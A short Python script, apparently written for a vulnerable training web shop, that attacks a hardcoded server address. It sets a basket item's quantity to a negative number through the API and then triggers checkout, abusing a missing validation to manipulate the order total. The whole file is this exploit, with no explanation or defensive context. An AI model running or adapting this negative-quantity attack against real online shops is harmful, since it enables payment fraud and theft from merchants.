import json

import requests

s = requests.Session()

r = s.put(
    'http://43.241.202.33:3003/api/BasketItems/20',
    data=json.dumps({"quantity": -10}),
    headers={'Content-type': 'application/json'},
)
print(r)
r = s.post(
    'http://43.241.202.33:3003/rest/basket/1/checkout',
)
print(r)
